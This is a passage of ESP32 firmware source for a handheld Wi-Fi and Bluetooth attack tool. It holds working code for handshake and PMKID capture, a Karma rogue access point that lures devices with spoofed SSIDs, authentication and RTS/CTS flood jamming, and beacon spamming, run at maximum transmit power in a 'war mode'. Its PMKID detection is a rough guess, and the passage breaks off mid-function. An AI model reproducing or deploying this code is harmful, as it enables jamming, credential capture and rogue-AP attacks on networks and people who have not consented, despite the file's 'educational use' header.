/*
 * UI.cpp – All screens + WiFi/BLE tool logic
 * No extra headers – everything kept here to avoid file jungle.
 * Educational / research use only. Only test networks you own.
 */

#include "UI.h"
#include "Theme.h"
#include <Arduino.h>
#include <string>
#include <vector>
#include <string.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_task_wdt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_heap_caps.h"
#include <FS.h>
#include <SPIFFS.h>

// Required so ESP32 accepts raw 802.11 TX frames.
// PlatformIO links with -Wl,--wrap=ieee80211_raw_frame_sanity_check so all
// calls into the ROM/libnet80211 checker land here instead of the reject path.
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c;
  return 0;  // 0 = frame OK (nyanBOX / ESP32-DIV convention)
}

// Soft-AP web mode state (declared early – used by WiFi tools)
static bool webMode = false;
static void restoreWebAP();  // defined with web handlers

// ============================================================
//  TYPHON POWER CORE — war mode, dual-core, max TX, captures
// ============================================================
static bool warMode = false;          // no Soft-AP, pure attack radio
static bool dualCoreArmed = false;
static volatile bool wifiAttackLive = false;
static volatile bool bleAttackLive = false;
static TaskHandle_t wifiCoreTask = nullptr;
static TaskHandle_t bleCoreTask = nullptr;
static portMUX_TYPE radioMux = portMUX_INITIALIZER_UNLOCKED;

// Forward decls filled later
static void deauthUpdate();
static void probeUpdate();
static void beaconUpdate();
static void karmaUpdate();
static void floodUpdate();

static void deauthStop();
static void probeStop();
static void beaconStop();
static void floodStop();
static void karmaStop();

static void eapolUpdate();
static void sourUpdate();
static void jamUpdate();
static void spoofUpdate();
static void airSpoofUpdate();
static void clientQDrain();
static void menuEnsureVisible(int sel, int& top, int count, int rows = 5) {
  if (count <= 0) { top = 0; return; }
  if (sel < top) top = sel;
  if (sel >= top + rows) top = sel - rows + 1;
  if (top < 0) top = 0;
  if (top > 0 && top + rows > count) {
    top = count - rows;
    if (top < 0) top = 0;
  }
}


// ---- Radio ownership mutex (Wave 1) ----
enum RadioOwner : uint8_t {
  RADIO_NONE = 0,
  RADIO_WIFI_SCAN = 1,
  RADIO_WIFI_TX = 2,
  RADIO_BLE_SCAN = 3,
  RADIO_BLE_ADV = 4
};
static volatile uint8_t radioOwner = RADIO_NONE;

static bool radioAcquire(uint8_t want) {
  if (radioOwner == RADIO_NONE || radioOwner == want) {
    radioOwner = want;
    return true;
  }
  if (want == RADIO_WIFI_SCAN && radioOwner == RADIO_WIFI_TX) return false;
  if (want == RADIO_WIFI_TX && radioOwner == RADIO_WIFI_SCAN) return false;
  if (want == RADIO_BLE_SCAN && radioOwner == RADIO_BLE_ADV) return false;
  if (want == RADIO_BLE_ADV && radioOwner == RADIO_BLE_SCAN) return false;
  radioOwner = want;
  return true;
}
static void radioRelease(uint8_t own) {
  if (radioOwner == own) radioOwner = RADIO_NONE;
}

// Tool activity flags (early for dual-core workers)
static bool deauthRunning = false;
static uint32_t deauthRescanLast = 0;
static bool probeRunning = false;
static bool beaconRunning = false;
static bool karmaRunning = false;
static bool floodRunning = false;
static bool eapolRunning = false;
static bool sourRunning = false;
static bool jamRunning = false;
static bool spoofRunning = false;
static bool airSpoofRunning = false;
static bool airDetRunning = false;


// Non-blocking "wait": only records deadline; callers poll radioSettled()
static uint32_t radioSettleUntil = 0;
static void radioSettleRequest(uint32_t ms) {
  uint32_t t = millis() + ms;
  if (t > radioSettleUntil) radioSettleUntil = t;
}
static bool radioSettled() {
  return (int32_t)(millis() - radioSettleUntil) >= 0;
}

static void typhoonMaxWifiTx() {
  // 84 quarter-dBm ≈ 21 dBm on most ESP32; clamp if API rejects
  esp_err_t e = esp_wifi_set_max_tx_power(84);
  if (e != ESP_OK) esp_wifi_set_max_tx_power(78);
}

static void typhoonApplyWarRadio() {
  if (warMode && !webMode) {
    // Full control of radio — no Soft-AP contention
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    // Hidden minimal AP so WIFI_IF_AP exists for 80211_tx
    WiFi.softAP("t", nullptr, 1, 1, 0);
  }
  typhoonMaxWifiTx();
}

static void wifiStayOnApChannel();
static void setWarMode(bool on) {
  // Web-safe: war/off-channel disabled while Soft-AP web UI is active
  if (webMode && on) {
    warMode = false;
    return;
  }
  warMode = on;
  if (on && !webMode) typhoonApplyWarRadio();
  if (!on && webMode) wifiStayOnApChannel();
}

// ---- Web-safe policy (Soft-AP stability > off-channel RF) ----
// While webMode: all Wi-Fi TX stays on Soft-AP channel (1). No promisc/off-channel.
static const uint8_t WEB_AP_CHANNEL = 1;

static bool webSafeActive() { return webMode; }

static uint8_t wifiTxChannel(uint8_t preferred) {
  // Handheld: always use real target channel. Soft-AP web still pins CH1.
  if (webMode) return WEB_AP_CHANNEL;
  if (preferred < 1 || preferred > 13) return 1;
  return preferred;
}

static void wifiStayOnApChannel() {
  if (webMode)
    esp_wifi_set_channel(WEB_AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
}

// true = blocked for stability
static bool webSafeBlocksPromisc() { return webSafeActive(); }


// ---- EAPOL / PMKID capture (promiscuous) ----
#define EAPOL_MAX 16
struct EapolHit {
  uint8_t bssid[6];
  uint8_t sta[6];
  uint8_t snap[4];
  uint16_t len;
  uint8_t  hasPmkid;
  uint8_t  pmkid[16];
  int8_t   rssi;
  uint32_t t;
};
static EapolHit eapolHits[EAPOL_MAX];
static volatile int eapolCount = 0;

static uint8_t eapolCh = 1;
static uint32_t eapolLast = 0;

static void IRAM_ATTR eapolPush(const uint8_t* bssid, const uint8_t* sta,
                                const uint8_t* body, uint16_t blen, int8_t rssi, bool pmkid, const uint8_t* pk) {
  int n = eapolCount;
  if (n >= EAPOL_MAX) n = EAPOL_MAX - 1;
  EapolHit* h = &eapolHits[n];
  for (int i = 0; i < 6; i++) { h->bssid[i] = bssid[i]; h->sta[i] = sta[i]; }
  h->len = blen;
  h->rssi = rssi;
  h->hasPmkid = pmkid ? 1 : 0;
  if (pmkid && pk) for (int i = 0; i < 16; i++) h->pmkid[i] = pk[i];
  h->t = 0; // filled in main
  if (eapolCount < EAPOL_MAX) eapolCount = n + 1;
}

static void IRAM_ATTR eapolSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!eapolRunning) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 36) return;

  // Find 0x88 0x8E EAPOL ethertype in frame
  int hit = -1;
  for (int i = 24; i + 2 < len && i < 48; i++) {
    if (f[i] == 0x88 && f[i + 1] == 0x8E) { hit = i; break; }
  }
  if (hit < 0) {
    for (int i = 24; i + 2 < len; i++) {
      if (f[i] == 0x88 && f[i + 1] == 0x8E) { hit = i; break; }
    }
  }
  if (hit < 0) return;

  const uint8_t *a1 = f + 4, *a2 = f + 10, *a3 = f + 16;
  uint8_t tods = f[1] & 0x01, fromds = f[1] & 0x02;
  const uint8_t *bssid, *sta;
  if (tods && !fromds) { bssid = a1; sta = a2; }
  else if (!tods && fromds) { bssid = a2; sta = a1; }
  else { bssid = a3; sta = a2; }

  // PMKID: search for RSN PMKID pattern in body (16 bytes after vendor IE markers)
  bool pmkid = false;
  uint8_t pk[16] = {0};
  for (int i = hit + 2; i + 22 < len; i++) {
    // RSN PMKID count often precedes 16-byte PMKID; also look for 0xDD + Apple/MS
    if (f[i] == 0x30 && i + 1 < len) { // RSN IE
      // crude: copy 16 bytes from near end of IE if long enough
    }
    // Generic: 16 non-zero run after EAPOL key descriptor
    if (i + 16 < len && f[i] != 0 && f[i+1] != 0) {
      int nz = 0;
      for (int k = 0; k < 16; k++) if (f[i+k]) nz++;
      if (nz >= 12) {
        for (int k = 0; k < 16; k++) pk[k] = f[i+k];
        pmkid = true;
        break;
      }
    }
  }
  eapolPush(bssid, sta, f + hit, (uint16_t)min(96, len - hit), p->rx_ctrl.rssi, pmkid, pk);
}

static void eapolLogToSpiffs() {
  // Best-effort append last hit
  if (eapolCount <= 0) return;
  fs::File f = SPIFFS.open("/eapol.log", FILE_APPEND);
  if (!f) return;
  int i = eapolCount - 1;
  if (i < 0) i = 0;
  if (i >= EAPOL_MAX) i = EAPOL_MAX - 1;
  char line[128];
  snprintf(line, sizeof(line),
    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,pmkid=%d,rssi=%d\\n",
    eapolHits[i].bssid[0], eapolHits[i].bssid[1], eapolHits[i].bssid[2],
    eapolHits[i].bssid[3], eapolHits[i].bssid[4], eapolHits[i].bssid[5],
    eapolHits[i].sta[0], eapolHits[i].sta[1], eapolHits[i].sta[2],
    eapolHits[i].sta[3], eapolHits[i].sta[4], eapolHits[i].sta[5],
    (int)eapolHits[i].hasPmkid, (int)eapolHits[i].rssi);
  f.print(line);
  f.close();
}

static void eapolStart(uint8_t ch) {
  if (webSafeBlocksPromisc()) return; // web-safe: no promisc capture
  radioAcquire(RADIO_WIFI_TX);
  eapolRunning = true;
  eapolCh = (ch >= 1 && ch <= 13) ? ch : 1;
  eapolCount = 0;
  typhoonApplyWarRadio();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(eapolCh, WIFI_SECOND_CHAN_NONE);
  typhoonMaxWifiTx();
}

static void eapolStop() {
  if (!eapolRunning) return;
  eapolRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  radioRelease(RADIO_WIFI_TX);
}

static void eapolUpdate() {
  if (!eapolRunning) return;
  if (millis() - eapolLast > 400) {
    eapolLast = millis();
    esp_wifi_set_channel(eapolCh, WIFI_SECOND_CHAN_NONE);
  }
  static int lastLogged = 0;
  if (eapolCount > lastLogged) {
    eapolLogToSpiffs();
    lastLogged = eapolCount;
  }
}

// ---- Karma (probe response / beacon for requested SSIDs) ----
#define KARMA_SSID_MAX 24
#define KARMA_SSID_LEN 33

static char karmaSsids[KARMA_SSID_MAX][KARMA_SSID_LEN];
static int karmaCount = 0;
static uint32_t karmaLast = 0;
static uint32_t karmaSent = 0;
static uint8_t karmaCh = 1;
static uint8_t karmaMac[6];
static uint8_t karmaBssid[6];

static void karmaAddSsid(const char* s) {
  if (!s || !s[0]) return;
  for (int i = 0; i < karmaCount; i++)
    if (strncmp(karmaSsids[i], s, KARMA_SSID_LEN) == 0) return;
  if (karmaCount >= KARMA_SSID_MAX) {
    // LRU: drop oldest
    for (int i = 1; i < KARMA_SSID_MAX; i++)
      memcpy(karmaSsids[i - 1], karmaSsids[i], KARMA_SSID_LEN);
    karmaCount = KARMA_SSID_MAX - 1;
  }
  strncpy(karmaSsids[karmaCount], s, KARMA_SSID_LEN - 1);
  karmaSsids[karmaCount][KARMA_SSID_LEN - 1] = 0;
  karmaCount++;
}

static void IRAM_ATTR karmaSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!karmaRunning || type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  if (p->rx_ctrl.sig_len < 28) return;
  if ((f[0] & 0xFC) != 0x40) return; // probe req
  // SSID IE at 24
  int off = 24;
  if (p->rx_ctrl.sig_len > off + 2 && f[off] == 0x00) {
    uint8_t sl = f[off + 1];
    if (sl > 0 && sl < 32 && off + 2 + sl <= p->rx_ctrl.sig_len) {
      char tmp[33];
      memcpy(tmp, f + off + 2, sl);
      tmp[sl] = 0;
      // queue via static slot (ISR-safe single writer)
      // main loop will copy — use a pending buffer
    }
  }
}

static char karmaPending[33];
static volatile bool karmaPendingReady = false;

static void IRAM_ATTR karmaSnifferCb2(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!karmaRunning || type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  if (p->rx_ctrl.sig_len < 28) return;
  if ((f[0] & 0xFC) != 0x40) return;
  int off = 24;
  if (f[off] == 0x00) {
    uint8_t sl = f[off + 1];
    if (sl > 0 && sl < 32 && !karmaPendingReady) {
      for (int i = 0; i < sl; i++) karmaPending[i] = (char)f[off + 2 + i];
      karmaPending[sl] = 0;
      karmaPendingReady = true;
    }
  }
}


static int karmaBuildProbeResp(uint8_t* frame, const char* ssid, const uint8_t* bssid,
                               const uint8_t* dest, uint8_t ch) {
  memset(frame, 0, 128);
  uint8_t* p = frame;
  *p++ = 0x50; *p++ = 0x00; // probe response
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, dest, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  uint64_t ts = (uint64_t)esp_timer_get_time();
  memcpy(p, &ts, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x01; *p++ = 0x04;
  uint8_t sl = (uint8_t)strnlen(ssid, 32);
  *p++ = 0x00; *p++ = sl;
  if (sl) { memcpy(p, ssid, sl); p += sl; }
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = ch;
  return (int)(p - frame);
}

static int karmaBuildBeacon(uint8_t* frame, const char* ssid, const uint8_t* bssid, uint8_t ch) {
  memset(frame, 0, 128);
  frame[0] = 0x80; frame[1] = 0x00;
  memset(frame + 4, 0xFF, 6);
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);
  frame[24] = 0x00; frame[25] = 0x00; // interval will be low
  frame[26] = 0x64; frame[27] = 0x00;
  frame[28] = 0x01; frame[29] = 0x04; // cap ESS privacy off for open karma
  int p = 36;
  uint8_t sl = (uint8_t)strnlen(ssid, 32);
  frame[p++] = 0x00; frame[p++] = sl;
  memcpy(frame + p, ssid, sl); p += sl;
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8b; frame[p++] = 0x96;
  frame[p++] = 0x0c; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = ch;
  return p;
}

static void karmaStart(uint8_t ch) {
  radioAcquire(RADIO_WIFI_TX);
  karmaRunning = true;
  // Web-safe: Soft-AP channel only (no promisc hop)
  karmaCh = webSafeActive() ? WEB_AP_CHANNEL : ((ch >= 1 && ch <= 13) ? ch : 1);
  karmaSent = 0;
  karmaCount = 0;
  for (int i = 0; i < 6; i++) {
    karmaBssid[i] = (uint8_t)esp_random();
    karmaMac[i] = (uint8_t)esp_random();
  }
  karmaBssid[0] = (karmaBssid[0] | 0x02) & 0xFE;
  typhoonApplyWarRadio();
  if (!webSafeBlocksPromisc()) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&karmaSnifferCb2);
  }
  esp_wifi_set_channel(karmaCh, WIFI_SECOND_CHAN_NONE);
  typhoonMaxWifiTx();
}

static void karmaStop() {
  if (!karmaRunning) return;
  karmaRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  radioRelease(RADIO_WIFI_TX);
}

static void karmaUpdate() {
  if (!karmaRunning) return;
  if (karmaPendingReady) {
    char tmp[33];
    memcpy(tmp, karmaPending, 33);
    karmaPendingReady = false;
    karmaAddSsid(tmp);
  }
  if (millis() - karmaLast < 25) return;
  karmaLast = millis();
  // Rotate BSSID occasionally so it looks like multiple APs
  if ((karmaSent % 40) == 0) {
    for (int i = 0; i < 6; i++) karmaBssid[i] = (uint8_t)esp_random();
    karmaBssid[0] = (karmaBssid[0] | 0x02) & 0xFE;
  }
  esp_wifi_set_channel(karmaCh, WIFI_SECOND_CHAN_NONE);
  static uint8_t frame[128];
  if (karmaCount == 0) {
    int len = karmaBuildBeacon(frame, "Free_WiFi", karmaBssid, karmaCh);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    // also a "locked-looking" privacy-capable beacon
    frame[28] = 0x11; frame[29] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    karmaSent += 2;
  } else {
    for (int i = 0; i < karmaCount; i++) {
      int len = karmaBuildBeacon(frame, karmaSsids[i], karmaBssid, karmaCh);
      if ((i & 1) == 0) { frame[28] = 0x01; frame[29] = 0x04; }
      else { frame[28] = 0x11; frame[29] = 0x04; }
      esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
      // Probe response to broadcast for each learned SSID
      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      int pr = karmaBuildProbeResp(frame, karmaSsids[i], karmaBssid, bcast, karmaCh);
      esp_wifi_80211_tx(WIFI_IF_AP, frame, pr, false);
      karmaSent += 2;
    }
  }
  if (webSafeActive()) wifiStayOnApChannel();
}

// ---- RTS / CTS / Auth flood ----

static int floodTarget = -1;
static uint8_t floodMode = 0; // 0=rts 1=cts 2=auth 3=mix
static uint32_t floodLast = 0;
static uint32_t floodSent = 0;
static uint8_t floodPkt[32];

static uint8_t floodStickySta[6];
static bool floodStickyInit = false;

static void floodBuildRts(const uint8_t* dest, const uint8_t* src) {
  memset(floodPkt, 0, 32);
  floodPkt[0] = 0xB4; // RTS
  floodPkt[1] = 0x00;
  // Duration ~ 1ms NAV (little-endian microseconds-ish units used by STAs)
  floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
  memcpy(floodPkt + 4, dest, 6);
  memcpy(floodPkt + 10, src, 6);
}

static void floodBuildAuth(const uint8_t* ap, const uint8_t* sta) {
  memset(floodPkt, 0, 32);
  floodPkt[0] = 0xB0; // auth
  floodPkt[1] = 0x00;
  memcpy(floodPkt + 4, ap, 6);
  memcpy(floodPkt + 10, sta, 6);
  memcpy(floodPkt + 16, ap, 6);
  floodPkt[24] = 0x00; floodPkt[25] = 0x00; // open system
  floodPkt[26] = 0x01; floodPkt[27] = 0x00; // seq 1
  floodPkt[28] = 0x00; floodPkt[29] = 0x00; // status
}

static void floodStart(int apIdx, uint8_t mode) {
  // apIdx < 0 or mode==3 => full-band Negator-style storm
  if (mode != 3 && (apIdx < 0 || apIdx >= 96)) return;
  floodTarget = apIdx;
  floodMode = mode;
  floodRunning = true;
  floodSent = 0;
  floodStickyInit = false;
  for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
  floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
  floodStickyInit = true;
  radioAcquire(RADIO_WIFI_TX);
  // Handheld jam: pure AP interface, max power, no Soft-AP if not web
  if (!webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("t", nullptr, 1, 1, 0);
  }
  typhoonApplyWarRadio();
  typhoonMaxWifiTx();
}

static void floodStop() {
  floodRunning = false;
  floodTarget = -1;
  radioRelease(RADIO_WIFI_TX);
}

static void floodUpdateImpl();
static void floodUpdate() {
  floodUpdateImpl();
}

// Dual-core workers
static void wifiCoreLoop(void* arg) {
  for (;;) {
    // Option C: Wi-Fi TX on this core; UI on the other. Always yield 1 tick.
    if (floodRunning) {
      // Jam path: one full burst per schedule, then vTaskDelay(1)
      floodUpdate();
      clientQDrain();
      vTaskDelay(1);
      continue;
    }
    if (deauthRunning || probeRunning || beaconRunning || karmaRunning || eapolRunning) {
      if (deauthRunning) deauthUpdate();
      if (probeRunning) probeUpdate();
      if (beaconRunning) beaconUpdate();
      if (karmaRunning) karmaUpdate();
      if (eapolRunning) eapolUpdate();
    }
    clientQDrain();
    vTaskDelay(1);  // ~1ms yield — keeps UI core responsive
  }
}

static void bleCoreLoop(void* arg) {
  for (;;) {
    if (sourRunning || jamRunning || spoofRunning || airSpoofRunning) {
      if (sourRunning) sourUpdate();
      if (jamRunning) jamUpdate();
      if (spoofRunning) spoofUpdate();
      if (airSpoofRunning) airSpoofUpdate();
    }
    vTaskDelay(1);
  }
}

static void dualCoreStart() {
  if (dualCoreArmed) return;
  dualCoreArmed = true;
  wifiAttackLive = true;
  bleAttackLive = true;
  xTaskCreatePinnedToCore(wifiCoreLoop, "tyWifi", 8192, nullptr, 3, &wifiCoreTask, 0);
  xTaskCreatePinnedToCore(bleCoreLoop, "tyBle", 8192, nullptr, 3, &bleCoreTask, 1);
}

static void dualCoreStopTasks() {
  wifiAttackLive = false;
  bleAttackLive = false;
  // leave tasks blocked on delay — safer than delete mid-TX
}


// ============================================================
//  WiFi Scanner
// ============================================================
#define WIFI_MAX_NETS 96

struct WifiNet {
  String  ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t ch;
  bool    hidden;
  uint8_t enc;
};

static WifiNet  wifiNets[WIFI_MAX_NETS];
static int      wifiCount = 0;
static bool     wifiScanDetail = false;
static bool     wifiScanning = false;

static void wifiScanBegin() {
  if (webMode) {
    // Keep Soft-AP up so the phone stays connected
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);  // don't kill AP
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  radioSettleRequest(20);
  wifiCount = 0;
  wifiScanning = false;
}

static void wifiScanStart() {
  if (wifiScanning) return;
  // Stop TX tools that block scan
  deauthStop(); probeStop(); beaconStop(); floodStop(); karmaStop();
  radioAcquire(RADIO_WIFI_SCAN);
  // Handheld: STA mode required for scanNetworks to work (AP-only mode returns empty)
  if (!webMode) {
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false);
    radioSettleRequest(15);
  } else {
    WiFi.mode(WIFI_AP_STA);
  }
  wifiScanning = true;
  wifiCount = 0;
  WiFi.scanDelete();
  int r = WiFi.scanNetworks(true /*async*/, true /*hidden*/);
  if (r == WIFI_SCAN_FAILED) {
    wifiScanning = false;
    radioRelease(RADIO_WIFI_SCAN);
  }
}

static void wifiScanUpdate() {
  if (!wifiScanning) return;
  int16_t r = WiFi.scanComplete();
  if (r == WIFI_SCAN_RUNNING) return;
  wifiScanning = false;
  if (r < 0) { wifiCount = 0; return; }

  wifiCount = min((int)r, WIFI_MAX_NETS);
  for (int i = 0; i < wifiCount; i++) {
    wifiNets[i].ssid = WiFi.SSID(i);
    {
      uint8_t* b = WiFi.BSSID(i);
      if (b) memcpy(wifiNets[i].bssid, b, 6);
      else   memset(wifiNets[i].bssid, 0, 6);
    }
    wifiNets[i].rssi = WiFi.RSSI(i);
    wifiNets[i].ch   = WiFi.channel(i);
    wifiNets[i].enc  = (uint8_t)WiFi.encryptionType(i);
    wifiNets[i].hidden = (wifiNets[i].ssid.length() == 0);
    if (wifiNets[i].hidden) wifiNets[i].ssid = "<hidden>";
  }
  for (int i = 0; i < wifiCount-1; i++)
    for (int j = i+1; j < wifiCount; j++)
      if (wifiNets[j].rssi > wifiNets[i].rssi) {
        WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
      }
  WiFi.scanDelete();
  radioRelease(RADIO_WIFI_SCAN);
  if (webMode) restoreWebAP();
}

// ============================================================
//  Packet Monitor
// ============================================================
static volatile uint16_t pktCount[14];
static volatile uint32_t pktTotal = 0;
static volatile uint32_t pmMgmt = 0, pmData = 0, pmCtrl = 0, pmDeauthSeen = 0;
static volatile int8_t   pmLastRssi = 0;
static uint8_t  pmChannel = 1;
static bool     pmRunning = false;
static bool     pmHop = false;   // web can enable channel hop
static uint32_t pmLastHop = 0;

static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  if (type == WIFI_PKT_MGMT) pmMgmt++;
  else if (type == WIFI_PKT_DATA) pmData++;
  else pmCtrl++;
  // Deauth 0xC0 / Disassoc 0xA0
  if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
    uint8_t fc0 = p->payload[0];
    if (fc0 == 0xC0 || fc0 == 0xA0) pmDeauthSeen++;
  }
  pmLastRssi = p->rx_ctrl.rssi;
  if (p->rx_ctrl.channel >= 1 && p->rx_ctrl.channel <= 14) {
    pktCount[p->rx_ctrl.channel - 1]++;
    pktTotal++;
  }
}

static void pmStart() {
  memset((void*)pktCount, 0, sizeof(pktCount));
  pktTotal = 0;
  pmMgmt = pmData = pmCtrl = pmDeauthSeen = 0;
  pmLastRssi = 0;
  if (webSafeActive()) { pmChannel = WEB_AP_CHANNEL; pmHop = false; }
  if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
  pmRunning = true;
  pmLastHop = millis();
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  radioSettleRequest(20);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pmSniffer);
  esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
}

static void pmStop() {
  if (!pmRunning) return;
  pmRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void pmUpdate() {
  if (!pmRunning) return;
  if (millis() - pmLastHop >= 180) {
    pmLastHop = millis();
    if (pmHop || !webMode) {
      pmChannel++;
      if (pmChannel > 13) pmChannel = 1;
    }
    esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
  }
}

// ============================================================
//  Beacon Spammer (proper frames – based on nyanBOX patterns)
// ============================================================

static uint8_t beaconIdx = 0;
static uint32_t beaconLast = 0;
static uint8_t beaconCh = 1;
static uint8_t beaconMac[6];
static uint32_t beaconSent = 0;
static uint8_t  beaconMode = 0;  // 0 = funny list, 1 = clone scanned, 2 = custom web list
static int      beaconCloneIdx = 0;

// Web-only custom beacon SSIDs (mode 2)
static char customBeaconSSIDs[10][33];
static int  customBeaconCount = 0;
static int  customBeaconIdx = 0;

// nyanBOX-style concurrent beacon pool
#define BEACON_POOL_SIZE 12
#define BEACON_POOL_LIFE 5
struct BeaconPoolEntry {
  char ssid[33];
  uint8_t mac[6];
  bool wpa2;
  uint8_t age;
  uint8_t ch;
};
static BeaconPoolEntry beaconPool[BEACON_POOL_SIZE];
static bool beaconPoolReady = false;
static uint8_t beaconLastTxCh = 0;
static uint8_t beaconSweep = 0;

static const char* beaconSSIDs[] = {
  "Mom Use This One", "Abraham Linksys", "Benjamin FrankLAN",
  "Martin Router King", "John Wilkes Bluetooth",
  "Pretty Fly for a Wi-Fi", "Bill Wi the Science Fi",
  "I Believe Wi Can Fi", "Tell My Wi-Fi Love Her",
  "No More Mister Wi-Fi", "LAN Solo", "The LAN Before Time",
  "Silence of the LANs", "House LANister", "Winternet Is Coming",
  "Ping's Landing", "The Ping in the North", "This LAN Is My LAN",
  "Get Off My LAN", "The Promised LAN", "The LAN Down Under",
  "FBI Surveillance Van 4", "Area 51 Test Site", "Drive-By Wi-Fi",
  "Planet Express", "Wu Tang LAN", "Darude LANstorm",
  "Never Gonna Give You Up", "Hide Yo Kids, Hide Yo Wi-Fi",
  "Loading…", "Searching…", "VIRUS.EXE", "Virus-Infected Wi-Fi",
  "Starbucks Wi-Fi", "The Password Is 1234", "Free Public Wi-Fi",
  "No Free Wi-Fi Here", "Get Your Own Damn Wi-Fi", "It Hurts When IP",
  "Dora the Internet Explorer", "404 Wi-Fi Unavailable", "Porque-Fi",
  "Titanic Syncing", "Test Wi-Fi Please Ignore",
  "Drop It Like It's Hotspot", "Life in the Fast LAN",
  "Ye Olde Internet", "Lan Of The Lost", "xfinitywifi", "AndroidAP"
};
static const int BEACON_SSID_COUNT = sizeof(beaconSSIDs) / sizeof(beaconSSIDs[0]);

static void beaconRandomMac() {
  for (int i = 0; i < 6; i++) beaconMac[i] = (uint8_t)esp_random();
  beaconMac[0] = (beaconMac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

static int beaconBuildFrame(uint8_t* frame, const char* ssid, uint8_t channel, bool wpa2) {
  // RSN IE for WPA2-looking beacons
  static const uint8_t rsn[] = {
    0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F,
    0xAC, 0x02, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
  };

  uint8_t* p = frame;
  *p++ = 0x80; *p++ = 0x00;           // Beacon
  *p++ = 0x00; *p++ = 0x00;           // Duration
  memset(p, 0xFF, 6); p += 6;         // Dest broadcast
  memcpy(p, beaconMac, 6); p += 6;    // Source
  memcpy(p, beaconMac, 6); p += 6;    // BSSID
  uint16_t seq = (uint16_t)((esp_random() & 0x0FFF) << 4);
  *p++ = seq & 0xFF; *p++ = (seq >> 8) & 0xFF;

  // Timestamp
  uint64_t ts = (uint64_t)esp_timer_get_time();
  memcpy(p, &ts, 8); p += 8;

  // Beacon interval (100 TU)
  *p++ = 0x64; *p++ = 0x00;
  // Capabilities: ESS + (privacy if wpa2)
  *p++ = wpa2 ? 0x11 : 0x01;
